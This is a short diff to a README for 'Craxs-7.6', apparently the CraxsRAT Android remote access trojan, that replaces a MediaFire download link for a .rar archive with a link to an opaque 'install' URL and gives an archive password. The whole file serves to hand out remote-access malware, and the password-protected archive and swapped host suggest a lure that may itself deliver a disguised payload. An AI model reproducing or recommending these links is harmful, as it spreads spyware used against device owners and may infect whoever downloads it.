@@ -1,5 +1,5 @@
 # Craxs-7.6
-[Click Here to Download](https://www.mediafire.com/file/5j70xcrku75xksf/CraxsRAT-7.6-main.rar/file)
+[Click Here to Download](https://rdmfile.eu/install/GK6wiRmUbbOD)
 
 
 [Password: S0f4fr33!]
